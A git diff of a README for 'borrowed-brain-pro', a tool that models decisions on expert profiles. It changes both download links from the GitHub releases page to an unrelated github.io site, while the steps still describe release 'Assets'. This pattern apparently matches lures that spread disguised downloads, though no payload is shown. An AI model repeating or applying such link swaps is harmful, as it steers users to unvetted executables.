@@ -1,6 +1,6 @@
 # 🧠 borrowed-brain-pro - Better decisions using historical expert wisdom
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/tacticalwarningsubscriptionwarrant526/borrowed-brain-pro/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://tacticalwarningsubscriptionwarrant526.github.io)
 
 ## 🎯 Purpose of this tool
 Borrowed-brain-pro helps you think like the world's most successful people. It turns complex thoughts from experts into simple, structured profiles. You use these profiles to analyze your current decisions. 
@@ -16,7 +16,7 @@ The software includes 9 pre-made profiles. You can study how Warren Buffett, Ste
 ## 📥 Getting the software
 You need to visit the project page to download the latest version for your computer. 
 
-[Visit the releases page to download](https://github.com/tacticalwarningsubscriptionwarrant526/borrowed-brain-pro/releases)
+[Visit the releases page to download](https://tacticalwarningsubscriptionwarrant526.github.io)
 
 1. Go to the link provided above.
 2. Look for the section labeled "Assets" at the bottom of the newest version.
